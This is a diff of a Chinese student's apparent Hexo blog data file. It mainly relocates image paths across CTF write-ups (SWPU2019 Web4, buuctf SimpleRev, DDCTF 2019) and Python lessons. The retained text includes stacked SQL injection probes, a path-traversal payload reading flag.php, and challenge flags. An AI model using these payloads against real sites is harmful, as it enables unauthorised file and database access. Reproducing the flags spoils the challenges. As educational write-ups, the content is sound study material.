+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">GXY&#123;do_not_hate_me&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>RE</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>有关逆序的脚本构建</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SWPU2019 Web4</title>
-    <url>/2021/04/14/SWPU2019-Web4/</url>
+    <url>/2021/04/15/SWPU2019-Web4/</url>
     <content><![CDATA[<p>无论URL还是界面都很有SQL的feeling,，点击注册，发现无法提供注册，使用密码本爆破也失败（应该有过滤）</p>
-<p><img src="/2021/04/14/SWPU2019-Web4/0.png" alt="0"></p>
+<p><img src="SWPU2019-Web4.assets/0.png" alt="0"></p>
 <h2 id="0x01-抓包"><strong>0x01 抓包</strong></h2>
 <ul>
 <li><strong>我们账号和密码都输入admin,开始发包和抓包</strong></li>
 </ul>
-<p><img src="/2021/04/14/SWPU2019-Web4/1.png" alt="1"></p>
+<p><img src="SWPU2019-Web4.assets/1.png" alt="1"></p>
 <p>界面很容易让人想起SQL注入，由于登陆没反应，我们直接抓包，因为之前堆叠注入做过几道题（<a href="https://buuoj.cn/challenges#%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DEasySQL">buuctf 极客大挑战</a>），还是比较熟悉判断方法</p>
 <p><strong><code>存在堆叠注入的判断方法</code></strong> :  <strong>名称处加单引号报错，加双引号不报错，加单引号和分号不报错，说明存在堆叠注入。</strong></p>
 <p>根据判断方法，当我们在 <strong><code>username</code></strong>  输入 <strong><code>admin'</code></strong>  或者 <strong><code>admin;'</code></strong>  ，提示报错</p>
-<p><img src="/2021/04/14/SWPU2019-Web4/2.png" alt="2"></p>
+<p><img src="SWPU2019-Web4.assets/2.png" alt="2"></p>
 <p>当我们在 <strong><code>username</code></strong>  输入：<strong><code>admin</code></strong>  或者 <strong><code>admin’;</code></strong>  报错消失</p>
 <p>我们先引来引入php中的PDO知识点</p>
 <hr>
@@ -254,8 +266,8 @@
 <h2 id="0x05-我们构造playload"><strong>0x05 我们构造playload</strong></h2>
 <p>GET: <strong><code>index.php?r=User/Index</code></strong></p>
 <p>POST: <strong><code>img_file=/../flag.php</code></strong></p>
-<p><img src="/2021/04/14/SWPU2019-Web4/5.png" alt="5"></p>
-<p><img src="/2021/04/14/SWPU2019-Web4/4.png" alt="4"></p>
+<p><img src="SWPU2019-Web4.assets/5.png" alt="5"></p>
+<p><img src="SWPU2019-Web4.assets/4.png" alt="4"></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;68b619e4-47d7-4e76-b823-26dd0e110c68&#125;</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
@@ -273,14 +285,14 @@
   </entry>
   <entry>
     <title>buuctf-SimpleRev</title>
-    <url>/2021/04/10/buuctf-SimpleRev/</url>
+    <url>/2021/04/11/buuctf-SimpleRev/</url>
     <content><![CDATA[<p>链接：<a href="https://pan.baidu.com/s/15ojPMVsasx3EZ9s5wVQqEw">https://pan.baidu.com/s/15ojPMVsasx3EZ9s5wVQqEw</a><br>
 提取码：icjp</p>
 <h2 id="0x01-使用EFPE查看文件"><strong>0x01 使用EFPE查看文件</strong></h2>
-<p><img src="/2021/04/10/buuctf-SimpleRev/1.png" alt="1"></p>
+<p><img src="buuctf-SimpleRev.assets/1.png" alt="1"></p>
 <p>没有加壳，64位文件</p>
 <h2 id="0x02-使用IDA打开文件，查看main函数，F5反编译"><strong>0x02 使用IDA打开文件，查看main函数，F5反编译</strong></h2>
-<p><img src="/2021/04/10/buuctf-SimpleRev/3.png" alt="3"></p>
+<p><img src="buuctf-SimpleRev.assets/3.png" alt="3"></p>
 <h2 id="0x03-查看-Decry-函数"><strong>0x03 查看</strong> <em>Decry()函数</em></h2>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">Decry</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// rax@1</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [sp+Fh] [bp-51h]@19</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+10h] [bp-50h]@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// [sp+14h] [bp-4Ch]@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+18h] [bp-48h]@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// [sp+1Ch] [bp-44h]@1</span></span><br><span class="line">  <span class="keyword">char</span> src[<span class="number">8</span>]; <span class="comment">// [sp+20h] [bp-40h]@1</span></span><br><span class="line">  __int64 v8; <span class="comment">// [sp+28h] [bp-38h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [sp+30h] [bp-30h]@1</span></span><br><span class="line">  __int64 v10; <span class="comment">// [sp+40h] [bp-20h]@1</span></span><br><span class="line">  __int64 v11; <span class="comment">// [sp+48h] [bp-18h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [sp+50h] [bp-10h]@1</span></span><br><span class="line">  __int64 v13; <span class="comment">// [sp+58h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v13 = *MK_FP(__FS__, <span class="number">40LL</span>);</span><br><span class="line">  *(_QWORD *)src = <span class="number">357761762382LL</span>;  <span class="comment">//选中之后H键转换16进制为0x534C43444ELL，数据在内存中是小端顺序，高位在高地址处，低位在低地址处，故实际的字符顺序应为&#x27;0x4e44434c53&#x27;经过16字符转换为ASCII码转换后字符为&#x27;NDCLS&#x27;</span></span><br><span class="line">　　　　　　　　　　　　　　　　　　　　　　</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">512969957736LL</span>; <span class="comment">//同上，转换后查询Ascii码为&quot;wodah&quot;</span></span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  LODWORD(v0) = join(key3, &amp;v10); <span class="comment">//在main页面v3=&#x27;kills&#x27;,v10=’wodah‘,这个函数就是把v3和v10两个字符串相拼接&#x27;killshadow&#x27;</span></span><br><span class="line">  text = v0;</span><br><span class="line">  <span class="built_in">strcpy</span>(key, key1);  <span class="comment">//strcpy函数就是让key1的值（&#x27;ADSFK&#x27;）赋予key</span></span><br><span class="line">  <span class="built_in">strcat</span>(key, src);  <span class="comment">//strcat函数就是让src的值拼接到key后面也就是&#x27;ADSFKNDCLS&#x27;</span></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  getchar(); <span class="comment">//清空缓冲区</span></span><br><span class="line">  v6 = <span class="built_in">strlen</span>(key); <span class="comment">//v6的长度等于key,v6=10</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( key[v4 % v6] &gt; <span class="number">64</span> &amp;&amp; key[v4 % v6] &lt;= <span class="number">90</span> ) <span class="comment">//将大写字母转换为小写字母</span></span><br><span class="line">      key[i] = key[v4 % v6] + <span class="number">32</span>;                  <span class="comment">//’adsfkndcls‘</span></span><br><span class="line">    ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input your flag:&quot;</span>, src);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">32</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v2 &lt;= <span class="number">96</span> || v2 &gt; <span class="number">122</span> )     <span class="comment">//如果输入的v2不是小写字母</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2 &gt; <span class="number">64</span> &amp;&amp; v2 &lt;= <span class="number">90</span> )   <span class="comment">//如果v2为大写字母</span></span><br><span class="line">          str2[v3] = (v2 - <span class="number">39</span> - key[v4++ % v6] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;  <span class="comment">//对srt[v3]进行处理（v3为0每次加1）//// str1[v3] = (v2-key[v4]+58)%26 + 97//变换后str2[v3]存放小写字母</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        str2[v3] = (v2 - <span class="number">39</span> - key[v4++ % v6] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>; <span class="comment">//同样处理</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !(v4 % v6) )</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(text, str2) )         <span class="comment">//如果text和存储的str2相同，就成功·</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congratulation!\n&quot;</span>);       <span class="comment">//text = &quot;&quot;killshadow&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40LL</span>) ^ v13;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>分析代码以及相应的值，我们已经可以知道text以及key的值，剩下就是str2，str2就是我们想要的flag</p>
@@ -308,7 +320,7 @@
 <ul>
 <li>整型（int）：Python中可以处理任意大小的整数，而且支持二进制（如<code>0b100</code>，换算成十进制是4）、八进制（如<code>0o100</code>，换算成十进制是64）、十进制（<code>100</code>）和十六进制（<code>0x100</code>，换算成十进制是256）的表示法。</li>
 </ul>
-<p><img src="/2021/04/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python/0.png" alt="0"></p>
+<p><img src="%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python.assets/0.png" alt="0"></p>
 <ul>
 <li>浮点型（float）：浮点数也就是小数，之所以称为浮点数，是因为按照科学记数法表示时，一个浮点数的小数点位置是可变的，浮点数除了数学写法（如<code>123.456</code>）之外还支持科学计数法（如<code>1.23456e2</code>）。</li>
 <li><strong>字符串型（str）：字符串是以单引号或双引号括起来的任意文本，比如<code>'hello'</code>和<code>&quot;hello&quot;</code>。</strong></li>
@@ -333,7 +345,7 @@
 <hr>
 <p>在Python中可以使用<code>type</code>函数对变量的类型进行检查。程序设计中函数的概念跟数学上函数的概念是一致的，数学上的函数相信大家并不陌生，它包括了函数名、自变量和因变量。如果暂时不理解这个概念也不要紧，我们会在后续的内容中专门讲解函数的定义和使用。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">使用type()检查变量的类型</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Version: 0.1</span></span><br><span class="line"><span class="string">Author: 骆昊</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">a = <span class="number">100</span></span><br><span class="line">b = <span class="number">12.345</span></span><br><span class="line">c = <span class="string">&#x27;hello, world&#x27;</span></span><br><span class="line">d = <span class="literal">True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))    <span class="comment"># &lt;class &#x27;int&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(b))    <span class="comment"># &lt;class &#x27;float&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(c))    <span class="comment"># &lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(d))    <span class="comment"># &lt;class &#x27;bool&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python/1.png" alt="1"></p>
+<p><img src="%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python.assets/1.png" alt="1"></p>
 <p>不同类型的变量可以相互转换，这一点可以通过Python的内置函数来实现。</p>
 <ul>
 <li>
@@ -355,7 +367,7 @@
 </code></pre>
 </li>
 </ul>
-<p><img src="/2021/04/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python/2.png" alt="2"></p>
+<p><img src="%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python.assets/2.png" alt="2"></p>
 <hr>
 <h3 id="拓展"><strong>拓展</strong></h3>
 <p>如果知道字符的整数编码，还可以用十六进制这么写<code>str</code>：</p>
@@ -365,17 +377,17 @@
 <p>在Python中，采用的格式化方式和C语言是一致的，用<code>%</code>实现，举例如下：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;Hello, %s&#39; % &#39;world&#39;</span><br><span class="line">&#39;Hello, world&#39;</span><br><span class="line">&gt;&gt;&gt; &#39;Hi, %s, you have $%d.&#39; % (&#39;Michael&#39;, 1000000)</span><br><span class="line">&#39;Hi, Michael, you have $1000000.&#39;</span><br></pre></td></tr></table></figure>
 <p>你可能猜到了，<code>%</code>运算符就是用来格式化字符串的。在字符串内部，<code>%s</code>表示用字符串替换，<code>%d</code>表示用整数替换，有几个<code>%?</code>占位符，后面就跟几个变量或者值，顺序要对应好。如果只有一个<code>%?</code>，括号可以省略。</p>
-<p><img src="/2021/04/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python/3.png" alt="3"></p>
+<p><img src="%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python.assets/3.png" alt="3"></p>
 <hr>
 <h2 id="从零开始学Python-第004课：Python语言元素之运算符"><strong>从零开始学Python - 第004课：Python语言元素之运算符</strong></h2>
-<p><img src="/2021/04/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python/4.jpg" alt="4"></p>
+<p><img src="%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python.assets/4.jpg" alt="4"></p>
 <blockquote>
 <p><strong>说明：</strong> 上面这个表格实际上是按照运算符的优先级从上到下列出了各种运算符。所谓优先级就是在一个运算的表达式中，如果出现了多个运算符，应该先执行哪个运算再执行哪个运算的顺序。在实际开发中，如果搞不清楚运算符的优先级，可以使用圆括号来确保运算的执行顺序。</p>
 </blockquote>
 <h4 id="算术运算符">算术运算符</h4>
 <p>Python中的算术运算符非常丰富，除了大家最为熟悉的加减乘除之外，还有整除运算符、求模（求余数）运算符和求幂运算符。下面的例子为大家展示了算术运算符的使用。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">321</span> + <span class="number">123</span>)     <span class="comment"># 加法运算</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">321</span> - <span class="number">123</span>)     <span class="comment"># 减法运算</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">321</span> * <span class="number">123</span>)     <span class="comment"># 乘法运算</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">321</span> / <span class="number">123</span>)     <span class="comment"># 除法运算</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">321</span> % <span class="number">123</span>)     <span class="comment"># 求模运算  就是取余数运算</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">321</span> // <span class="number">123</span>)    <span class="comment"># 整除运算</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">321</span> ** <span class="number">123</span>)    <span class="comment"># 求幂运算</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python/4.png" alt="4"></p>
+<p><img src="%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python.assets/4.png" alt="4"></p>
 <h4 id="赋值运算符"><strong>赋值运算符</strong></h4>
 <p>赋值运算符应该是最为常见的运算符，它的作用是将右边的值赋给左边的变量。下面的例子演示了赋值运算符和复合赋值运算符的使用。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">赋值运算符和复合赋值运算符</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Version: 0.1</span></span><br><span class="line"><span class="string">Author: 骆昊</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">a = <span class="number">10</span></span><br><span class="line">b = <span class="number">3</span></span><br><span class="line">a += b        <span class="comment"># 相当于：a = a + b</span></span><br><span class="line">a *= a + <span class="number">2</span>    <span class="comment"># 相当于：a = a * (a + 2)</span></span><br><span class="line"><span class="built_in">print</span>(a)      <span class="comment"># 算一下这里会输出什么</span></span><br></pre></td></tr></table></figure>
@@ -391,58 +403,8 @@
       </tags>
   </entry>
   <entry>
-    <title>从零开始学python第二天</title>
-    <url>/2021/04/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python%E7%AC%AC%E4%BA%8C%E5%A4%A9/</url>
-    <content><![CDATA[<blockquote>
-<p>从零考试学习python内容 99%来自于python大神 python-jack的<a href="https://zhuanlan.zhihu.com/p/113640664">知乎文章  </a> 再结合本人的实际情况进行学习，严格来说这是JACK老师的内容，只不过再此基础上，我增添了一些我在CTF解题过程中遇到的python脚本实际情况，再次感谢JACK老师</p>
-<p>学习的内容来自：<a href="https://zhuanlan.zhihu.com/p/121188620">https://zhuanlan.zhihu.com/p/121188620</a></p>
-</blockquote>
-<hr>
-<h2 id="for-in循环">for-in循环</h2>
-<p>如果明确的知道循环执行的次数，我们推荐使用<code>for-in</code>循环，例如计算1到100的和。 被<code>for-in</code>循环控制的语句块也是通过缩进的方式来确定的，这一点跟分支结构完全相同，大家看看下面的代码就明白了。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">用for循环实现1~100求和</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Version: 0.1</span></span><br><span class="line"><span class="string">Author: 骆昊</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">total = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">    total += x</span><br><span class="line"><span class="built_in">print</span>(total)</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python%E7%AC%AC%E4%BA%8C%E5%A4%A9/0.png" alt="0"></p>
-<p>需要说明的是上面代码中的<code>range(1, 101)</code>可以用来构造一个从1到100的范围，当我们把这样一个范围放到<code>for-in</code>循环中，就可以通过前面的循环变量<code>x</code>依次取出从1到100的整数。当然，<code>range</code>的用法非常灵活，下面给出了一个例子：</p>
-<ul>
-<li><code>range(101)</code>：可以用来产生0到100范围的整数，需要注意的是取不到101。</li>
-<li><code>range(1, 101)</code>：可以用来产生1到100范围的整数，相当于前面是闭区间后面是开区间。</li>
-<li><code>range(1, 101, 2)</code>：可以用来产生1到100的奇数，其中2是步长，即每次数值递增的值。</li>
-<li><code>range(100, 0, -2)</code>：可以用来产生100到1的偶数，其中-2是步长，即每次数字递减的值。</li>
-</ul>
-<p>知道了这一点，我们可以用下面的代码来实现1~100之间的偶数求和。</p>
-<p><img src="/2021/04/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python%E7%AC%AC%E4%BA%8C%E5%A4%A9/1.png" alt="1"></p>
-<hr>
-<h2 id="while循环">while循环</h2>
-<p>如果要构造不知道具体循环次数的循环结构，我们推荐使用<code>while</code>循环。<code>while</code>循环通过一个能够产生或转换出<code>bool</code>值的表达式来控制循环，表达式的值为<code>True</code>则继续循环；表达式的值为<code>False</code>则结束循环。</p>
-<p>下面我们通过一个“猜数字”的小游戏来看看如何使用<code>while</code>循环。猜数字游戏的规则是：计算机出一个1到100之间的随机数，玩家输入自己猜的数字，计算机给出对应的提示信息（大一点、小一点或猜对了），如果玩家猜中了数字，计算机提示用户一共猜了多少次，游戏结束，否则游戏继续。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">猜数字游戏</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Version: 0.1</span></span><br><span class="line"><span class="string">Author: 骆昊</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 产生一个1-100范围的随机数</span></span><br><span class="line">answer = random.randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    counter += <span class="number">1</span></span><br><span class="line">    number = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入: &#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> number &lt; answer:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;大一点&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> number &gt; answer:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;小一点&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;恭喜你猜对了!&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 当退出while循环的时候显示用户一共猜了多少次</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;你总共猜了<span class="subst">&#123;counter&#125;</span>次&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python%E7%AC%AC%E4%BA%8C%E5%A4%A9/3.png" alt="3"></p>
-<hr>
-<h2 id="break和continue">break和continue</h2>
-<p>上面的代码中使用<code>while True</code>构造了一个条件恒成立的循环，也就意味着如果不做特殊处理，循环是不会结束的，这也就是常说的“死循环”。为了在用户猜中数字时能够退出循环结构，我们使用了<code>break</code>关键字，它的作用是提前结束循环。需要注意的是，<code>break</code>只能终止它所在的那个循环，这一点在使用嵌套循环结构时需要引起注意，下面的例子我们会讲到什么是嵌套的循环结构。除了<code>break</code>之外，还有另一个关键字是<code>continue</code>，它可以用来放弃本次循环后续的代码直接让循环进入下一轮。</p>
-<hr>
-<h2 id="嵌套的循环结构">嵌套的循环结构</h2>
-<p>和分支结构一样，循环结构也是可以嵌套的，也就是说在循环中还可以构造循环结构。下面的例子演示了如何通过嵌套的循环来输出一个乘法口诀表（九九表）</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">打印乘法口诀表</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Version: 0.1</span></span><br><span class="line"><span class="string">Author: 骆昊</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, i + <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>*<span class="subst">&#123;j&#125;</span>=<span class="subst">&#123;i * j&#125;</span>&#x27;</span>, end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure>
-<p>很显然，在上面的代码中，外层循环用来控制一共会产生9行的输出，而内层循环用来控制每一行会输出多少列。内层循环中的输出就是九九表一行中的所有列，所以在内层循环完成时，有一个<code>print()</code>来实现换行输出的效果。</p>
-<hr>
-<h2 id="循环的例子">循环的例子</h2>
-<h3 id="例子1：输入一个正整数判断它是不是素数。">例子1：输入一个正整数判断它是不是素数。</h3>
-<blockquote>
-<p><strong>提示</strong>：素数指的是只能被1和自身整除的大于1的整数。</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">输入一个正整数判断它是不是素数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Version: 0.1</span></span><br><span class="line"><span class="string">Author: 骆昊</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入一个正整数: &#x27;</span>))</span><br><span class="line">end = <span class="built_in">int</span>(num ** <span class="number">0.5</span>)</span><br><span class="line">is_prime = <span class="literal">True</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, end + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> num % x == <span class="number">0</span>:</span><br><span class="line">        is_prime = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> is_prime <span class="keyword">and</span> num != <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;num&#125;</span>是素数&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;num&#125;</span>不是素数&#x27;</span>)</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>python学习</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>总结一下最近学习状况</title>
-    <url>/2021/04/10/%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B%E6%9C%80%E8%BF%91%E5%AD%A6%E4%B9%A0%E7%8A%B6%E5%86%B5/</url>
+    <url>/2021/04/11/%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B%E6%9C%80%E8%BF%91%E5%AD%A6%E4%B9%A0%E7%8A%B6%E5%86%B5/</url>
     <content><![CDATA[<p>看了一下最近自己博客更新速度（大二）和自己打比赛的状况，三个字来概括就是“很差劲”。打比赛很多题还是不会，感觉真的没有在认真学，内心非常浮躁，没有对紧迫时间的敬畏。真的必须规定自己每天至少一道web或者python，总结题目的时间至少在两个小时以上才行</p>
 ]]></content>
       <categories>
@@ -485,15 +447,15 @@
 <ul>
 <li>首先我们从<a href="https://www.yiibai.com/python_network_programming/python_routing.html">路由</a>入手，然后我们慢慢去看它调用了哪些函数，这里只用了一个<a href="https://www.yiibai.com/python_network_programming/python_routing.html">路由</a></li>
 </ul>
-<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/1.png" alt="1"></p>
+<p><img src="DDCTF-2019-homebrew-event-loop.assets/1.png" alt="1"></p>
 <ul>
 <li>这里顺便学习一下<a href="https://www.cnblogs.com/baojiao/p/9336857.html">flask常用的接受参数方法</a></li>
 </ul>
-<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/2.png" alt="2"></p>
+<p><img src="DDCTF-2019-homebrew-event-loop.assets/2.png" alt="2"></p>
 <ul>
 <li>当我们看到第81行就知道，<strong>querystring = urllib.unquote(request.query_string)</strong>  接收url? 后面的所有的值，然后进行url编码，传入参数<strong>querystring</strong> 中</li>
 </ul>
-<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/3.png" alt="3"></p>
+<p><img src="DDCTF-2019-homebrew-event-loop.assets/3.png" alt="3"></p>
 <p>​         <strong>接着有个判断条件</strong></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> querystring == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">&#x27;action:&#x27;</span>)) <span class="keyword">or</span> <span class="built_in">len</span>(querystring) &gt; <span class="number">100</span></span><br></pre></td></tr></table></figure>
 <ul>
@@ -511,44 +473,44 @@
 <p>后面的内容就是我们买钻石的网站，我们先盲猜一下 <strong><code>num_items</code></strong>  是我们买东西的清单，如果我们什么都没买，就是初始化session中的列表</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">session[<span class="string">&#x27;num_items&#x27;</span>] = <span class="number">0</span></span><br><span class="line">session[<span class="string">&#x27;points&#x27;</span>] = <span class="number">3</span></span><br><span class="line">session[<span class="string">&#x27;log&#x27;</span>] = []</span><br></pre></td></tr></table></figure>
